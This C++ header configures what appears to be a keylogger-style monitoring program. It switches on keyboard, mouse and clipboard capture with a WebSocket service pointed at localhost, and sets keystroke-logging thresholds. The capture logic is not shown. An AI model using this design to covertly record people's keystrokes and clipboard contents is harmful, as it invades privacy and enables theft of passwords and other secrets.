#pragma once

// ---
// Service toggle
// ---

#define KEYBOARD_SERVICE	true
#define MOUSE_SERVICE		true
#define CLIPBOARD_SERVICE	true
#define WEBSOCKET_SERVICE	true

// ---
// WebSocket settings
// ---

// WebSocket server host
#define WS_HOST "ws://localhost:8080/"

// After how many seconds server retries to connect
// after fail
#define WS_CONNECTION_DELAY_SEC 1

// ---
// Keyboard settings
// ---

// Amount of keypresses of the same button
// after which keyboard stops logging it
#define KBD_MAX_REPEATS 5

// How many times key should be pressed to save data
#define KBD_KEYS_TO_SAVE 100

// Name of keyboard service working directory
#define KBD_DIR "kbd"

// ---
// Service includes
// ---

#if KEYBOARD_SERVICE
#include "keyboard.hpp"
#endif
#if MOUSE_SERVICE
#include "mouse.hpp"
#endif
#if CLIPBOARD_SERVICE
#include "clipboard.hpp"
#endif
#if WEBSOCKET_SERVICE
#include "websocket.hpp"
#endif

namespace Services
{
	static void RunAll()
	{
#if KEYBOARD_SERVICE
		Keyboard::Run();
#endif
#if MOUSE_SERVICE
		Mouse::Run();
#endif
#if CLIPBOARD_SERVICE
		Clipboard::Run();
#endif
#if WEBSOCKET_SERVICE
		WebSocket::Run();
#endif
	}

	static void StopAll()
	{
#if KEYBOARD_SERVICE
		Keyboard::Stop();
#endif
#if MOUSE_SERVICE
		Mouse::Stop();
#endif
#if CLIPBOARD_SERVICE
		Clipboard::Stop();
#endif
#if WEBSOCKET_SERVICE
		WebSocket::Stop();
#endif
	}
}